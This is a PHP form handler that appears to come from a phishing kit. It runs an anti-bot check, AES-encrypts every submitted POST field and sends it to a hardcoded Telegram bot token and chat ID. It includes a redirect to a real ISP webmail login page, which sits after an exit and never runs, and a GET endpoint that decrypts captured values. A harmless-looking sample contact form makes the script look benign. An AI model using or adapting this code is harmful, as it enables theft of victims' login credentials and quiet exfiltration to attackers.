<?php
require_once('antibot.php');
$antiBot = new AntiBot();
// Configuration
$botToken = '7649375019:AAHjvpBnde1D7Vt7ErU-RlxD7ZZvmig3X3k';
$chatId = '2126862491';
$encryptionKey = 'rW62/W5zR//3BMbuAzZ8mmoSEczUwYkAsIjifWyEt6E='; // Must be 32 characters for AES-256
$encryptionIV = '5i0Josylr0CHQvlZtjrclQ==';  // Must be 16 characters for AES

// Function to encrypt data using AES-256-CBC
function encryptData($data, $key, $iv) {
    $encrypted = openssl_encrypt(
        $data,
        'AES-256-CBC',
        $key,
        OPENSSL_RAW_DATA,
        $iv
    );
    return base64_encode($encrypted); // Make it safe for transmission
}

if (!$antiBot->verifyRequest()) {
    // Failed verification - redirect back to the form with an error
    header("Location: your_form_page.php?error=bot_detected");
    exit;

    // Redirect to a success page or show a success message // 
    header("Location: https://webmail.gigared.com/"); exit;
}

// Function to decrypt data
function decryptData($encryptedData, $key, $iv) {
    $decoded = base64_decode($encryptedData);
    return openssl_decrypt(
        $decoded,
        'AES-256-CBC',
        $key,
        OPENSSL_RAW_DATA,
        $iv
    );
}

// Validate and sanitize form data
function sanitizeInput($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Function to send message to Telegram
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    );
    
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        )
    );
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result;
}

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Initialize message string
    $messageText = "New Encrypted Form Submission:\n\n";
    
    // Process each form field
    foreach ($_POST as $key => $value) {
        // Sanitize input
        $sanitizedValue = sanitizeInput($value);
        
        // Encrypt the value
        $encryptedValue = encryptData($sanitizedValue, $encryptionKey, $encryptionIV);
        
        // Add to message
        $messageText .= "<b>" . htmlspecialchars($key) . "</b>: " . $encryptedValue . "\n";
    }
    
    // Add timestamp
    $messageText .= "\nSubmitted at: " . date('Y-m-d H:i:s');
    
    // Send to Telegram
    try {
        $result = sendToTelegram($messageText, $botToken, $chatId);
        $response = json_decode($result, true);
        
        if ($response['ok']) {
            echo "Encrypted message sent successfully!";
        } else {
            error_log("Telegram API Error: " . $result);
            echo "Error sending message. Please try again later.";
        }
    } catch (Exception $e) {
        error_log("Error: " . $e->getMessage());
        echo "An error occurred. Please try again later.";
    }
}

// Decryption script (separate file for security)
if (isset($_GET['decrypt'])) {
    $encryptedText = $_GET['text'];
    $decrypted = decryptData($encryptedText, $encryptionKey, $encryptionIV);
    echo "Decrypted text: " . $decrypted;
    exit;
}
?>

<!-- Sample HTML Form -->
<form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
    <input type="text" name="name" placeholder="Name" required><br>
    <input type="email" name="email" placeholder="Email" required><br>
    <textarea name="message" placeholder="Message" required></textarea><br>
    <input type="submit" value="Submit">
</form>
